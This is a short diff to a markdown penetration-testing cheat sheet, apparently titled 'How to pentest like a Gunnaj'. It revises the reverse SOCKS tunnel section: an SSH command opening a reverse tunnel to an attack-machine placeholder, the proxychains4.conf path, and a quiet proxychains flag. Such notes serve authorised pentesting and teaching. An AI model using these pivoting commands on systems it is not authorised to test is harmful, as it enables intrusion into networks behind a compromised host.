@@ -369,10 +369,10 @@ How to pentest like a Gunnaj
 
   ### Reverse SOCKS tunnel
   ```shell
-  ssh -N -D 127.0.0.1:1080 -R <PORT>:127.0.0.1:1080 <ssh_user>@<ATTACK_MACHINE_IP>
+  ssh -N -R <PORT> <ssh_user>@<ATTACK_MACHINE_IP>
   ```
 
-  ### Edit /etc/proxychains
+  ### Edit /etc/proxychains4.conf
   ```shell
   [ProxyList]
   socks5 127.0.0.1 <PORT>
@@ -380,7 +380,7 @@ How to pentest like a Gunnaj
 
   ### Sending command via the tunnel
   ```shell
-  proxychains <command>
+  proxychains -q <command>
   ```
 
 </details> 
